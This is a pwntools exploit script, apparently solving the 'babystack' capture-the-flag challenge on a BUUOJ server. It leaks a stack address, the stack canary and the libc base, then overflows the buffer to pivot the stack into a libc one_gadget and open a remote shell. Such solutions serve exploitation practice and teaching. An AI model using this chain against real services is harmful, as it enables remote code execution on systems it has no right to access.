from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('babystack')
io = remote('node4.buuoj.cn', 29336)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('babystack')
leave_ret = 0x400824

# leak stack
io.sendlineafter('>> ', '1')
io.send('a' * 0x80)
io.sendlineafter('>> ', '2')
buf = u64(io.recvn(0x86)[-6:].ljust(8, b'\x00')) - 0x170
log.success('buf: ' + hex(buf))

# leak canary
io.sendlineafter('>> ', '1')
io.send('a' * 0x89)
io.sendlineafter('>> ', '2')
canary = u64(b'\x00' + io.recvn(0x90)[-7:])
log.success('canary: ' + hex(canary))

# leak libc
io.sendlineafter('>> ', '1')
io.send('a' * 0x98)
io.sendlineafter('>> ', '2')
libc_base = u64(io.recvn(0x9e)[-6:].ljust(8, b'\x00')) - libc.symbols['__libc_start_main'] - 240
log.success('libc_base: ' + hex(libc_base))

# stack pivot and ret one_gadget
# one_gadget = libc_base + 0x4527a		# for local
one_gadget = libc_base + 0x4526a
io.sendlineafter('>> ', '1')
payload = b'a' * 8 + p64(one_gadget) + b'\x00' * 0x78 + p64(canary) + p64(buf) + p64(leave_ret)
io.send(payload)
io.sendlineafter('>> ', '3')
io.interactive()

